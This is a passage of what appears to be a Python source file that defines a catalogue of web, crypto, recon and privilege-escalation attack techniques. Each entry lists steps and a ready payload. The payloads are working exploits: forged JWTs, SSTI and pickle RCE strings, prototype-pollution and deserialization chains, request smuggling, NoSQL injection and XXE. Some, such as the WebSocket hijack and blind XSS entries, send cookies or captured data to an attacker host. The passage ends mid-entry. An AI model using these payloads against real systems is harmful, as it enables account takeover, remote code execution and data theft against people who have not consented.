        "Bypass JWT signature verification by changing the algorithm to 'none'. Many JWT libraries accept tokens with alg=none, skipping signature verification entirely.",
        "Decode JWT token header. Check if server accepts tokens with alg:none. Look for jwt/jsonwebtoken library usage.",
        [
            "1. Capture a valid JWT token from authentication flow",
            "2. Decode the header (base64url) and change 'alg' from 'RS256'/'HS256' to 'none'",
            "3. Modify the payload (e.g., change user role to admin)",
            "4. Re-encode header and payload, remove signature (keep trailing dot)",
            "5. Send modified token and check for elevated access",
        ],
        'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.',
        "easy")

    ctf("JWT Key Confusion (RS256 to HS256)", "web", "auth_bypass", "jwt",
        "When a server uses RS256, change to HS256 and sign the token with the public key (which is known). The server may verify the HMAC using its RSA public key as the HMAC secret.",
        "Check if JWT uses RS256. Obtain the public key from /jwks.json, /.well-known/jwks.json, or certificate. Test if server accepts HS256 tokens signed with the public key.",
        [
            "1. Get the server's RSA public key (JWKS endpoint, /robots.txt, certificate)",
            "2. Change JWT header alg from RS256 to HS256",
            "3. Modify payload claims as desired",
            "4. Sign the token using HMAC-SHA256 with the public key as the secret",
            "5. Send the forged token",
        ],
        "python3 jwt_tool.py TOKEN -X k -pk public.pem",
        "medium")

    ctf("SSTI Sandbox Escape", "web", "rce", "python",
        "Server-Side Template Injection with sandbox bypass. Access Python builtins through MRO chain to escape Jinja2/Mako sandbox and achieve RCE.",
        "Inject {{7*7}} in template fields (names, emails, etc.). If 49 appears, SSTI is confirmed. Test error messages for template engine identification.",
        [
            "1. Confirm SSTI: inject {{7*7}}, ${7*7}, #{7*7}, etc.",
            "2. Identify template engine from error messages or syntax",
            "3. For Jinja2: traverse MRO to find subprocess or os module",
            "4. Use ''.__class__.__mro__[1].__subclasses__() to enumerate available classes",
            "5. Find Popen (usually index ~400) or os._wrap_close for RCE",
        ],
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "medium")

    ctf("Prototype Pollution Chain", "web", "rce", "nodejs",
        "Exploit JavaScript prototype pollution to achieve RCE or privilege escalation. Polluting Object.prototype can affect application logic, template engines (EJS/Pug/Handlebars), or child_process.spawn.",
        "Look for deep merge/clone functions, query parameter parsing (qs), or JSON.parse with recursive assignment. Test with __proto__.polluted=1.",
        [
            "1. Identify prototype pollution sink (merge, extend, clone functions)",
            "2. Inject __proto__ or constructor.prototype with payload",
            "3. For EJS RCE: pollute outputFunctionName to inject code",
            "4. For child_process: pollute shell/env to execute commands",
            "5. For Handlebars: pollute template helpers",
        ],
        '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\'child_process\').exec(\'id\');s"}}',
        "hard")

    ctf("Java Deserialization Gadget Chains", "web", "rce", "java",
        "Exploit unsafe Java deserialization using known gadget chains (Commons Collections, Spring, Hibernate). Craft serialized objects that execute arbitrary code upon deserialization.",
        "Look for Base64-encoded serialized Java objects (rO0AB prefix), Content-Type: application/x-java-serialized-object, or custom binary protocols on non-standard ports.",
        [
            "1. Identify deserialization endpoint (cookies, parameters, custom protocols)",
            "2. Enumerate classpath libraries (error messages, /WEB-INF/lib/)",
            "3. Use ysoserial to generate payload for available gadget chain",
            "4. Common chains: CommonsCollections1-7, Spring1-2, Hibernate1-2",
            "5. Send serialized payload and verify execution",
        ],
        "java -jar ysoserial.jar CommonsCollections6 'curl ATTACKER' | base64",
        "hard")

    ctf("PHP Deserialization Gadget Chains", "web", "rce", "php",
        "Exploit PHP unserialize() with POP chains found in frameworks (Laravel, Symfony, WordPress). Magic methods __wakeup, __destruct, __toString trigger gadget chains.",
        "Look for serialized PHP objects in cookies, parameters (O:4:\"User\":...), or base64-encoded data. Check for unserialize() in source code.",
        [
            "1. Identify unserialize() sink (cookies, session data, cached data)",
            "2. Determine framework/libraries (composer.json, error pages)",
            "3. Use PHPGGC to generate gadget chain payload",
            "4. Common chains: Laravel/RCE1-8, Symfony/RCE1-4, Monolog/RCE1-5",
            "5. Encode and send payload",
        ],
        "phpggc Laravel/RCE5 'system' 'id' -b  # base64 output",
        "hard")

    ctf("Python Pickle Deserialization", "web", "rce", "python",
        "Exploit Python pickle/unpickle to execute arbitrary code via __reduce__ method. Common in Flask sessions, caching backends, and ML model loading.",
        "Look for base64-encoded pickle data in cookies, API responses, or file uploads (.pkl, .pickle). Flask sessions with cookie-based storage may use pickle.",
        [
            "1. Identify pickle deserialization (base64 decode and check for pickle opcodes)",
            "2. Craft malicious pickle with __reduce__ returning os.system call",
            "3. Encode payload in expected format (base64, hex)",
            "4. Replace legitimate pickle data with malicious payload",
        ],
        "import pickle,os,base64\nclass Exploit:\n    def __reduce__(self):\n        return (os.system, ('id',))\nprint(base64.b64encode(pickle.dumps(Exploit())))",
        "medium")

    ctf("Ruby Deserialization (Marshal.load)", "web", "rce", "ruby",
        "Exploit Ruby Marshal.load with gadget chains from common gems (ERB, ActiveSupport). Universal Deserialisation Gadget for Ruby achieves RCE.",
        "Look for Base64-encoded Marshal data (starts with \\x04\\x08). Check for cookies or parameters containing serialized Ruby objects.",
        [
            "1. Identify Marshal.load usage (session cookies, caching, IPC)",
            "2. Use universal gadget chain with ERB template execution",
            "3. Craft payload using Gem::Requirement and Gem::StubSpecification",
            "4. Encode and replace legitimate serialized data",
        ],
        "ruby -e 'require \"erb\"; payload = ERB.new(\"<%= `id` %>\"); puts Marshal.dump(payload).unpack(\"H*\")[0]'",
        "hard")

    ctf("GraphQL Batching Attack", "web", "auth_bypass", "graphql",
        "Abuse GraphQL batching to bypass rate limiting, brute-force credentials, or extract data in parallel. Send array of queries in single request.",
        "Check if endpoint accepts array of queries: POST [{query1}, {query2}]. Test /graphql, /api/graphql, /graphiql.",
        [
            "1. Confirm GraphQL batching support by sending array of queries",
            "2. For brute-force: batch login mutations with different passwords",
            "3. For 2FA bypass: batch verification code attempts (0000-9999)",
            "4. For data extraction: batch queries with different IDs/aliases",
            "5. Use aliases for same-field batching within single query",
        ],
        '[{"query":"mutation{login(user:\\"admin\\",pass:\\"pass1\\"){token}}"},{"query":"mutation{login(user:\\"admin\\",pass:\\"pass2\\"){token}}"},{"query":"mutation{login(user:\\"admin\\",pass:\\"pass3\\"){token}}"}]',
        "easy")

    ctf("Race Condition (TOCTOU)", "web", "logic_flaw", "generic",
        "Time-of-Check to Time-of-Use race condition. Send concurrent requests to exploit the gap between authorization check and action execution.",
        "Look for operations involving balance/credits, coupon redemption, vote/like systems, account registration limits, or file operations.",
        [
            "1. Identify state-changing operation with value (balance, coupon, vote)",
            "2. Prepare multiple identical requests",
            "3. Send all requests simultaneously using threading/async",
            "4. Use HTTP/2 single-packet attack for precise timing",
            "5. Verify if the operation was applied multiple times",
        ],
        "# Python race condition exploit\nimport threading, requests\ndef redeem():\n    requests.post('http://TARGET/api/coupon/redeem', data={'code':'SAVE50'}, cookies={'session':'...'})\nthreads = [threading.Thread(target=redeem) for _ in range(20)]\nfor t in threads: t.start()",
        "medium")

    ctf("HTTP Request Smuggling CL.TE", "web", "request_smuggling", "generic",
        "Content-Length vs Transfer-Encoding request smuggling. Front-end uses Content-Length, back-end uses Transfer-Encoding, allowing request poisoning.",
        "Send ambiguous requests with both CL and TE headers. Check for timeout differences, response desynchronization, or unexpected 400/405 errors.",
        [
            "1. Confirm CL.TE by sending request with both headers where TE body is shorter",
            "2. The smuggled content becomes prefix of next user's request",
            "3. Use to poison other users' requests, bypass access controls, or capture credentials",
            "4. Detect via timing: normal request = fast, smuggled chunk = delayed",
        ],
        "POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED",
        "hard")

    ctf("HTTP Request Smuggling TE.CL", "web", "request_smuggling", "generic",
        "Transfer-Encoding vs Content-Length smuggling. Front-end uses TE, back-end uses CL, allowing prefix injection into subsequent requests.",
        "Send request where TE-parsed body is longer than CL-parsed body. Monitor for response queue poisoning.",
        [
            "1. Front-end processes Transfer-Encoding (chunked), back-end processes Content-Length",
            "2. Craft chunked body where CL covers only part of the chunked data",
            "3. Remaining data is treated as start of next request by back-end",
            "4. Use to hijack responses, bypass WAF, or access restricted endpoints",
        ],
        "POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST /admin HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n",
        "hard")

    ctf("Web Cache Poisoning", "web", "cache_poisoning", "generic",
        "Poison web caches by injecting malicious content via unkeyed headers (X-Forwarded-Host, X-Original-URL, etc.) that the origin reflects but the cache doesn't vary on.",
        "Identify cacheable responses (Cache-Control, X-Cache headers). Test unkeyed inputs that reflect in response body or headers.",
        [
            "1. Find cacheable endpoint with Param Miner or manual testing",
            "2. Identify unkeyed input (header/cookie) reflected in response",
            "3. Inject XSS/redirect payload via unkeyed input",
            "4. Send request to poison cache for that URL",
            "5. Subsequent users receive poisoned cached response",
        ],
        "GET /page HTTP/1.1\nHost: TARGET\nX-Forwarded-Host: evil.com\n# If response includes <script src=//evil.com/...>, cache is poisoned",
        "hard")

    ctf("Host Header Injection", "web", "redirect", "generic",
        "Inject malicious Host header to poison password reset links, cache entries, or SSRF. Many apps trust the Host header for URL generation.",
        "Send requests with modified Host header, X-Forwarded-Host, or duplicate Host headers. Check if password reset emails contain attacker's host.",
        [
            "1. Trigger password reset with modified Host header pointing to attacker server",
            "2. Victim receives email with reset link pointing to attacker's domain",
            "3. When victim clicks, attacker captures the reset token",
            "4. Alternative: use for web cache poisoning or SSRF",
        ],
        "POST /reset-password HTTP/1.1\nHost: evil.com\nContent-Type: application/x-www-form-urlencoded\n\nemail=victim@target.com",
        "easy")

    ctf("Password Reset Poisoning", "web", "account_takeover", "generic",
        "Abuse password reset functionality by manipulating the Host header or X-Forwarded-Host to redirect reset tokens to attacker-controlled server.",
        "Trigger password reset and check if the reset URL in email uses the Host header value. Try X-Forwarded-Host, X-Host, X-Original-URL headers.",
        [
            "1. Find password reset functionality",
            "2. Submit reset request with X-Forwarded-Host: attacker.com",
            "3. If app uses this header for URL generation, reset email contains attacker.com",
            "4. Victim clicks link, token goes to attacker server",
            "5. Attacker uses captured token to reset victim's password",
        ],
        "POST /forgot HTTP/1.1\nHost: target.com\nX-Forwarded-Host: evil.com\n\nemail=victim@target.com",
        "easy")

    ctf("2FA Bypass Techniques", "web", "auth_bypass", "generic",
        "Multiple methods to bypass two-factor authentication: direct endpoint access, response manipulation, brute-force via rate limit bypass, session fixation after 2FA.",
        "Test if 2FA is enforced server-side: after login, skip 2FA page and directly access authenticated endpoints. Check if 2FA code has rate limiting.",
        [
            "1. Skip 2FA: After login, navigate directly to /dashboard or /api/me",
            "2. Response manipulation: Change {'success':false} to {'success':true} in response",
            "3. Brute force: If 4-digit code, batch requests or use IP rotation",
            "4. Backup codes: Try default/common backup codes",
            "5. Session fixation: Set session cookie before 2FA, check if it persists",
        ],
        "# After login (step 1), skip /2fa/verify and directly access:\ncurl -b 'session=TOKEN_FROM_LOGIN' 'http://TARGET/api/dashboard'",
        "medium")

    ctf("OAuth Redirect Flaws", "web", "account_takeover", "oauth",
        "Exploit open redirect or lax redirect_uri validation in OAuth flows to steal authorization codes/tokens. Common in social login implementations.",
        "Test redirect_uri parameter: try subdomain (evil.target.com), path traversal (target.com/../evil.com), fragment injection, URL encoding.",
        [
            "1. Map the OAuth flow and identify redirect_uri validation",
            "2. Test permutations: evil.com, *.target.com, target.com.evil.com",
            "3. Try path traversal: /callback/../../../evil",
            "4. Use open redirect on target as intermediate hop",
            "5. If implicit flow: token in fragment goes to redirect_uri page",
        ],
        "https://oauth.target.com/authorize?response_type=code&client_id=CLIENT&redirect_uri=https://target.com/callback/../../../evil.com&scope=openid",
        "medium")

    ctf("CRLF Injection / HTTP Response Splitting", "web", "injection", "generic",
        "Inject CRLF (\\r\\n) characters to add arbitrary headers or split HTTP responses. Can lead to XSS, cache poisoning, or session fixation.",
        "Inject %0d%0a in URL parameters, headers, or cookie values that are reflected in response headers (Location, Set-Cookie).",
        [
            "1. Identify user input reflected in response headers",
            "2. Inject %0d%0a (CRLF) followed by arbitrary header",
            "3. For XSS: inject Content-Type: text/html and HTML body after double CRLF",
            "4. For session fixation: inject Set-Cookie header",
        ],
        "http://TARGET/redirect?url=http://target.com%0d%0aSet-Cookie:%20admin=true%0d%0a%0d%0a<script>alert(1)</script>",
        "easy")

    ctf("DOM Clobbering", "web", "xss", "javascript",
        "Override JavaScript variables and object properties using named HTML elements (id/name attributes). Can escalate to XSS when combined with DOM sinks.",
        "Look for code accessing global variables that could be clobbered (window.CONFIG, document.getElementById without null check). HTMLCollection creates arrays from duplicate names.",
        [
            "1. Identify JavaScript code referencing global objects/variables",
            "2. Create HTML elements with id/name matching target variable",
            "3. Use anchor tags for controlled toString(): <a id=CONFIG href=//evil.com>",
            "4. For nested properties: <form id=CONFIG><input id=url name=url value=//evil.com>",
            "5. Leverage clobbered value in a DOM sink (innerHTML, src, href)",
        ],
        '<a id="defaultAvatar" href="cid:&quot;onerror=alert(1)//"></a>',
        "hard")

    ctf("postMessage XSS", "web", "xss", "javascript",
        "Exploit insecure postMessage handlers that don't validate message origin. Common in widgets, OAuth popups, and cross-domain communication.",
        "Search for window.addEventListener('message') in JavaScript. Check if origin is validated. Look for data flowing into DOM sinks.",
        [
            "1. Find postMessage listeners: grep for addEventListener.*message in JS files",
            "2. Check if event.origin is validated before processing",
            "3. If no validation: create attacker page that opens/iframes target",
            "4. Send postMessage with payload that hits a DOM sink",
            "5. Test with: window.open('http://TARGET').postMessage('payload','*')",
        ],
        "<script>\nvar w = window.open('http://TARGET/page');\nsetTimeout(function(){\n    w.postMessage('<img src=x onerror=alert(document.domain)>','*');\n}, 2000);\n</script>",
        "medium")

    ctf("WebSocket Hijacking (CSWSH)", "web", "csrf", "websocket",
        "Cross-Site WebSocket Hijacking. If WebSocket handshake relies only on cookies (no CSRF token), an attacker page can establish a WebSocket connection to the target and exfiltrate data.",
        "Check if WebSocket upgrade request includes only cookies for authentication. No Origin validation = vulnerable.",
        [
            "1. Identify WebSocket endpoints (ws:// or wss://)",
            "2. Check if handshake only uses cookies (no custom header/token)",
            "3. Create attacker page that connects to target WebSocket",
            "4. The browser attaches victim's cookies automatically",
            "5. Read/write WebSocket messages from attacker page",
        ],
        "<script>\nvar ws = new WebSocket('wss://TARGET/ws');\nws.onmessage = function(e) {\n    fetch('https://ATTACKER/steal?data=' + btoa(e.data));\n};\nws.onopen = function() {\n    ws.send('{\"action\":\"get_profile\"}');\n};\n</script>",
        "medium")

    # === Crypto Techniques ===

    ctf("Padding Oracle Attack", "crypto", "crypto", "generic",
        "Exploit CBC mode padding validation to decrypt ciphertext or forge valid ciphertext without knowing the key. Server reveals valid/invalid padding via different error responses or timing.",
        "Identify CBC-encrypted tokens (cookies, parameters). Modify last byte of ciphertext blocks and observe response differences (200 vs 500, different error messages, timing).",
        [
            "1. Identify CBC-encrypted value and block size (typically 16 bytes)",
            "2. Modify bytes in penultimate block and observe padding oracle",
            "3. Use PadBuster or custom script to decrypt byte-by-byte",
            "4. Once plaintext is known, forge new valid ciphertext",
            "5. Replace original cookie/token with forged value",
        ],
        "padbuster http://TARGET/login Cookie_VALUE 16 -cookies 'auth=Cookie_VALUE' -encoding 0",
        "hard")

    ctf("Hash Length Extension", "crypto", "crypto", "generic",
        "Exploit Merkle-Damgard hash functions (MD5, SHA1, SHA256) to append data to a known hash without knowing the secret. Works when MAC = hash(secret + message).",
        "Look for hash-based message authentication in API signatures. Format: hash(secret + user_data) where you know the hash and user_data but not the secret.",
        [
            "1. Identify MAC scheme using hash(secret || message)",
            "2. Obtain a valid (message, MAC) pair",
            "3. Use hash_extender or HashPump to compute hash(secret || message || padding || extension)",
            "4. The new hash is valid without knowing the secret",
            "5. Append desired data (e.g., &admin=true) to the message",
        ],
        "hashpump -s KNOWN_HASH -d 'user=normal' -a '&admin=true' -k SECRET_LENGTH",
        "hard")

    ctf("Timing Attack", "crypto", "auth_bypass", "generic",
        "Exploit string comparison timing differences to brute-force secrets character by character. Constant-time comparison prevents this; standard strcmp does not.",
        "Measure response times for different input lengths/values. Statistical analysis needed. Best with local network (low jitter).",
        [
            "1. Identify authentication endpoint with string comparison",
            "2. Measure response time for each character position",
            "3. Correct characters take slightly longer (or shorter) due to early exit",
            "4. Use statistical methods (multiple samples per character)",
            "5. Iterate character by character to recover the secret",
        ],
        "# Timing attack script\nimport requests, time, statistics\nchars = 'abcdef0123456789'\nfor pos in range(32):\n    times = {}\n    for c in chars:\n        token = known + c + 'x' * (31-pos)\n        samples = []\n        for _ in range(100):\n            start = time.time()\n            requests.get(f'http://TARGET/verify?token={token}')\n            samples.append(time.time()-start)\n        times[c] = statistics.median(samples)\n    known += max(times, key=times.get)",
        "hard")

    # === Recon Techniques ===

    ctf("Subdomain Takeover", "recon", "subdomain_takeover", "dns",
        "Claim unclaimed resources pointed to by CNAME records. When a subdomain points to a third-party service (S3, Heroku, GitHub Pages) that is no longer claimed, an attacker can register that resource.",
        "Enumerate subdomains and check CNAME records. Look for NXDOMAIN responses or service-specific error pages (NoSuchBucket, There is no app configured at that hostname).",
        [
            "1. Enumerate subdomains (amass, subfinder, DNS brute-force)",
            "2. Check CNAME records for each subdomain",
            "3. Identify CNAMEs pointing to third-party services",
            "4. Check if the target resource is unclaimed (error pages, NXDOMAIN)",
            "5. Register the resource and serve content on the subdomain",
        ],
        "# Check for dangling CNAMEs\ndig CNAME subdomain.target.com\n# Common vulnerable services: S3, Heroku, GitHub Pages, Shopify, Fastly, Azure\n# S3: 'NoSuchBucket'\n# Heroku: 'No such app'\n# GitHub: '404 - There isn\\'t a GitHub Pages site here'",
        "easy")

    ctf("S3 Bucket Enumeration", "recon", "info_disclosure", "aws",
        "Discover and exploit misconfigured S3 buckets. Common naming patterns: company-name, company-backup, company-assets, company-dev, company-staging.",
        "Check for common bucket names: http://COMPANY.s3.amazonaws.com, http://s3.amazonaws.com/COMPANY. Try ListBucket, GetObject, PutObject operations.",
        [
            "1. Generate bucket name wordlist based on company name",
            "2. Check each bucket: aws s3 ls s3://BUCKET --no-sign-request",
            "3. If listable, download contents for sensitive data",
            "4. Check write access: aws s3 cp test.txt s3://BUCKET/test.txt --no-sign-request",
            "5. Check for sensitive files: .env, credentials, backups, source code",
        ],
        "aws s3 ls s3://COMPANY-backup --no-sign-request\naws s3 cp s3://COMPANY-backup/db-dump.sql . --no-sign-request",
        "easy")

    ctf("Git/SVN Exposure", "recon", "info_disclosure", "generic",
        "Discover exposed .git or .svn directories that allow full source code recovery. Common in deployments that copy the entire repo to web root.",
        "Check for /.git/HEAD, /.git/config, /.svn/entries, /.svn/wc.db returning valid content.",
        [
            "1. Check for /.git/HEAD — should contain 'ref: refs/heads/...'",
            "2. If accessible, use git-dumper or GitTools to download full repo",
            "3. Reconstruct source code: git checkout .",
            "4. Search for credentials, API keys, internal URLs in commit history",
            "5. For SVN: download .svn/wc.db (SQLite) and extract file contents",
        ],
        "git-dumper http://TARGET/.git/ ./output\ncd output && git log --all --oneline | head -20\ngit diff HEAD~5..HEAD",
        "easy")

    ctf("Backup File Discovery", "recon", "info_disclosure", "generic",
        "Find backup files left by editors or deployment processes. These bypass server-side processing and reveal source code.",
        "Brute-force common backup extensions: .bak, .old, .orig, .save, .swp, .swo, ~, .copy, .tmp, .conf.bak for each discovered file.",
        [
            "1. For each discovered file (e.g., index.php), check backup variants",
            "2. Extensions: .bak, .old, .orig, ~, .save, .swp, .swo, .php.bak, .php~",
            "3. Check editor artifacts: .#file, #file#, file.php.save",
            "4. Check common backup paths: /backup/, /old/, /bak/, /archive/",
            "5. Try version numbers: file.php.1, file.php.2, file_20231201.php",
        ],
        "ffuf -u http://TARGET/FUZZ -w backup-wordlist.txt\n# Common finds: config.php.bak, .env.old, database.sql.gz, web.config.old",
        "easy")

    ctf("Source Map Exposure", "recon", "info_disclosure", "javascript",
        "Discover .js.map files that contain original source code of minified JavaScript. Often left in production deployments accidentally.",
        "For each JS file, append .map and check for valid source map JSON. Also check for //# sourceMappingURL= comments in JS files.",
        [
            "1. Enumerate JavaScript files from the page source",
            "2. Append .map to each JS URL and check for 200 response",
            "3. Check for sourceMappingURL comment in JS files",
            "4. Download .map files and extract original source using shuji or source-map-explorer",
            "5. Analyze source for hardcoded credentials, API endpoints, business logic",
        ],
        "# Find source maps\ncurl -s http://TARGET/static/js/main.chunk.js | grep -o 'sourceMappingURL=.*'\ncurl -s http://TARGET/static/js/main.chunk.js.map | python3 -m json.tool | grep '\"sources\"'",
        "easy")

    # === Privilege Escalation Techniques ===

    ctf("IDOR Chain to Admin", "privesc", "idor", "generic",
        "Chain multiple IDOR vulnerabilities to escalate from regular user to admin. Start with low-impact IDOR (view other profiles) and escalate to account takeover or admin access.",
        "Test all API endpoints with sequential/predictable IDs. Replace your user ID with other IDs. Check both GET (read) and PUT/PATCH (modify) operations.",
        [
            "1. Map all API endpoints that use user/resource IDs",
            "2. Create two accounts and test cross-account access",
            "3. Enumerate IDs: try ID=1 (often admin), sequential IDs, UUIDs from other users",
            "4. Chain: read admin email via IDOR → reset admin password",
            "5. Or: modify role via PUT /api/users/ADMIN_ID with {role: 'admin'}",
        ],
        "# Read other user's data\ncurl -H 'Authorization: Bearer USER_TOKEN' 'http://TARGET/api/users/1'\n# Modify other user's role\ncurl -X PUT -H 'Authorization: Bearer USER_TOKEN' 'http://TARGET/api/users/1' -d '{\"role\":\"admin\"}'",
        "easy")

    ctf("Mass Assignment", "privesc", "mass_assignment", "generic",
        "Exploit mass assignment / autobinding to set privileged fields. When the server binds request parameters directly to model objects, attacker can set unintended fields like role, isAdmin, balance.",
        "During registration or profile update, add extra fields (role, isAdmin, is_admin, permissions, balance, credits). Check API documentation for model fields not exposed in UI.",
        [
            "1. Register account normally and observe request parameters",
            "2. Add extra fields: role=admin, isAdmin=true, balance=99999",
            "3. Try different parameter formats: JSON, form-data, query params",
            "4. Check common field names: role, type, permissions, group, level, admin",
            "5. After modification, verify elevated privileges",
        ],
        "curl -X POST 'http://TARGET/api/register' -H 'Content-Type: application/json' -d '{\"username\":\"attacker\",\"password\":\"pass123\",\"email\":\"a@evil.com\",\"role\":\"admin\",\"isAdmin\":true}'",
        "easy")

    ctf("HTTP Parameter Pollution", "privesc", "hpp", "generic",
        "Send duplicate parameters to exploit differences in how front-end and back-end handle them. Can bypass WAFs, override server-side parameters, or confuse validation logic.",
        "Send same parameter multiple times with different values. Check which value the application uses. Test in query string, POST body, and mixed.",
        [
            "1. Identify parameter handling behavior (first, last, array, concatenated)",
            "2. For WAF bypass: waf sees first value (clean), app uses last (malicious)",
            "3. For logic bypass: amount=1&amount=1000 — validation checks first, processing uses last",
            "4. Mixed sources: GET ?role=user with POST role=admin",
            "5. Framework-specific: PHP uses last, ASP.NET concatenates, Express uses first",
        ],
        "# WAF bypass via HPP\ncurl 'http://TARGET/transfer?amount=1&to=victim&amount=99999'\n# OR mixed: query param + body param\ncurl 'http://TARGET/transfer?to=legitimate' -d 'to=attacker&amount=99999'",
        "medium")

    ctf("GraphQL Introspection & Exploitation", "web", "info_disclosure", "graphql",
        "Use GraphQL introspection to discover the full API schema, then exploit authorization flaws, hidden mutations, and data exposure in fields not used by the frontend.",
        "Send introspection query to /graphql endpoint. If blocked, try variations: __schema with newlines, GET vs POST, different Content-Types.",
        [
            "1. Send introspection query: {__schema{types{name,fields{name,type{name}}}}}",
            "2. Map all queries, mutations, and types",
            "3. Look for admin-only mutations accessible to regular users",
            "4. Query fields not shown in UI (email, internalId, role, password hash)",
            "5. Test nested query depth for DoS and circular reference data extraction",
        ],
        '{"query":"{__schema{queryType{name}mutationType{name}types{name fields{name args{name type{name}}type{name kind ofType{name}}}}}}"}',
        "easy")

    ctf("NoSQL Injection", "web", "nosqli", "mongodb",
        "Exploit NoSQL databases (MongoDB, CouchDB) using operator injection. Unlike SQL, NoSQL injection uses JSON operators like $gt, $ne, $regex, $where.",
        "Test login forms with JSON: {\"username\":{\"$ne\":\"\"}, \"password\":{\"$ne\":\"\"}}. Test URL params: user[$ne]=&pass[$ne]=.",
        [
            "1. Test operator injection: {\"$gt\":\"\"}, {\"$ne\":\"\"}, {\"$regex\":\".*\"}",
            "2. Authentication bypass: username[$ne]=x&password[$ne]=x",
            "3. Data extraction with $regex: password[$regex]=^a, ^b, ..., ^aX...",
            "4. $where injection: {\"$where\":\"this.password.match(/^a/)\"} for blind extraction",
            "5. Test both URL-encoded and JSON body formats",
        ],
        "curl -X POST 'http://TARGET/login' -H 'Content-Type: application/json' -d '{\"username\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}}'",
        "medium")

    ctf("XXE via File Upload", "web", "xxe", "generic",
        "Exploit XML parsing in file uploads: SVG images, DOCX/XLSX/PPTX (Office Open XML), PDF, and other XML-based formats trigger XXE when parsed server-side.",
        "Upload SVG with XXE entity. Upload DOCX with modified [Content_Types].xml or word/document.xml containing XXE. Check if content is reflected.",
        [
            "1. Create SVG with XXE: <svg><text>&xxe;</text></svg> with DTD entity",
            "2. Create DOCX: unzip, add XXE to [Content_Types].xml, rezip",
            "3. Test XLSX: modify xl/sharedStrings.xml with XXE entity",
            "4. For blind XXE: use OOB via DTD pointing to attacker server",
            "5. Check file preview/thumbnail generation for triggered parsing",
        ],
        '<?xml version="1.0"?>\n<!DOCTYPE svg [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<svg xmlns="http://www.w3.org/2000/svg">\n  <text x="0" y="20">&xxe;</text>\n</svg>',
        "medium")

    ctf("Type Juggling Authentication Bypass", "web", "auth_bypass", "php",
        "Exploit PHP loose comparison (==) to bypass authentication. When comparing a string to 0 or comparing magic hashes (0e...), PHP type juggling returns unexpected true values.",
        "Test login with numeric values, arrays, and magic hash strings. Check if PHP uses == instead of === for password comparison.",
        [
            "1. Identify PHP application using loose comparison for auth",
            "2. Test password='0' against hashes starting with 0e (magic hashes)",
            "3. Test array injection: password[]='' to bypass strcmp()",
            "4. Common magic hashes: MD5('240610708') = 0e462097431906...",
            "5. If strcmp(user_input, stored) == 0, passing array makes strcmp return NULL, NULL == 0 is true",
        ],
        "# Magic hash bypass\ncurl -X POST 'http://TARGET/login' -d 'user=admin&password=240610708'\n# Array bypass for strcmp\ncurl -X POST 'http://TARGET/login' -d 'user=admin&password[]=anything'",
        "easy")

    ctf("Insecure Direct Object Reference via UUID Prediction", "web", "idor", "generic",
        "Exploit predictable UUIDs (v1) that encode timestamp and MAC address. UUIDv1 is sequential and guessable, unlike UUIDv4. Knowing one UUID allows predicting others created around the same time.",
        "Check if resource IDs are UUIDv1 (version nibble = 1, e.g., xxxxxxxx-xxxx-1xxx-xxxx-xxxxxxxxxxxx). Extract timestamp and MAC to predict adjacent UUIDs.",
        [
            "1. Collect a valid UUID from the application",
            "2. Check if it's v1 (third group starts with 1)",
            "3. Extract timestamp component and generate adjacent UUIDs",
            "4. Use tools like uuid_tool to decode: uuid_tool decode UUID",
            "5. Iterate nearby timestamps to enumerate other resources",
        ],
        "# Decode UUIDv1\npython3 -c \"import uuid; u=uuid.UUID('KNOWN_UUID'); print(f'Time: {u.time}, Node: {u.node:012x}')\"",
        "medium")

    ctf("Server-Side Template Injection (SSTI) Detection Matrix", "web", "rce", "generic",
        "Systematic SSTI detection using polyglot payloads that identify the template engine. Different engines parse different syntax, allowing fingerprinting before exploitation.",
        "Inject {{7*7}}, ${7*7}, #{7*7}, {7*7}, <%= 7*7 %> and observe which evaluates. Use error messages to fingerprint the engine.",
        [
            "1. Test polyglot: {{7*'7'}} — Jinja2 returns 7777777, Twig returns 49",
            "2. Confirm engine: Jinja2={{config}}, Twig={{_self}}, Freemarker=${7*7}",
            "3. Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "4. Twig RCE: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "5. Freemarker RCE: <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
        ],
        "# Polyglot detection\n${{<%[%'\"}}%\\.\n# Jinja2 confirmed:\n{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "medium")

    ctf("Blind XSS via Stored Payloads in Admin Panels", "web", "xss", "generic",
        "Inject XSS payloads in user-facing inputs that are later viewed by administrators in internal dashboards. The payload fires in the admin context, stealing admin cookies/tokens.",
        "Inject blind XSS payloads (with callback) in every user input: support tickets, feedback forms, user profiles, order notes, registration fields. Use XSS Hunter or similar callback service.",
        [
            "1. Set up XSS callback server (XSS Hunter, Burp Collaborator)",
            "2. Inject callback payload in all user-controlled fields",
            "3. Target fields viewed by admins: support tickets, user profiles, logs",
            "4. Payload fires when admin views the data in internal dashboard",
            "5. Capture admin session, cookies, DOM screenshot, page URL",
        ],
        "'><script src=https://ATTACKER/probe.js></script>\n\"><img src=x onerror=fetch('https://ATTACKER/steal?c='+document.cookie)>",
        "easy")

    ctf("Server-Side Request Forgery (SSRF) via PDF Generation", "web", "ssrf", "generic",
        "Exploit server-side PDF/image generation (wkhtmltopdf, Puppeteer, PhantomJS) to perform SSRF. HTML input is rendered server-side, allowing access to internal services.",
        "Look for PDF export, screenshot, or report generation features. Inject HTML/CSS with links to internal services. Try iframe, img, link, and @import.",
        [
            "1. Identify PDF/image generation endpoints",
            "2. Inject HTML with internal URLs: <iframe src='http://169.254.169.254/'>",
            "3. Use CSS: @import url('http://internal:8080/admin');",
            "4. For blind: <img src='http://ATTACKER/ssrf?data=test'>",
            "5. Try file:// protocol for local file read: <iframe src='file:///etc/passwd'>",
        ],
